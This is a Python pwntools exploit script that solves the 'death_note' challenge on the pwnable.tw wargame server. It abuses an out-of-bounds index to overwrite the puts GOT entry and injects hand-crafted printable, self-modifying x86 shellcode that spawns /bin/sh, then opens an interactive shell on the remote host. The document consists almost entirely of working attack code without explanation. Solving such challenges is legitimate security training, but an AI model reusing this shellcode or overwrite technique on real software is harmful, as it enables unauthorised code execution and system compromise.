from pwn import *
debug = 0
elf = ELF('./death_note')
if debug:
	p = process('./death_note')
	context.log_level = 'debug'
	gdb.attach(p,'b *0x80487ef')
else:
	p = remote('chall.pwnable.tw', 10201)


def add(p,index,s):
	p.recvuntil('Your choice :')
	p.sendline('1')
	p.recvuntil('Index :')
	p.sendline(index)
	p.recvuntil('Name :')
	p.sendline(s)

bss = 0x804a060
puts_got = elf.got['puts']
print hex(puts_got)

offset = (puts_got - bss)/4
#
'''
shellcode = shellcraft.sh()
print len(asm(shellcode))
print hex(asm(shellcode))
'''
shellcode = '''
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx

    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl

    push ecx
    pop edx



    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
    push edx
    pop edx
    push edx
    pop edx
'''
print hex(len(asm(shellcode)))
print asm(shellcode)
shellcode = asm(shellcode) + '\x6b\x40'

add(p,str(offset),shellcode)

p.interactive()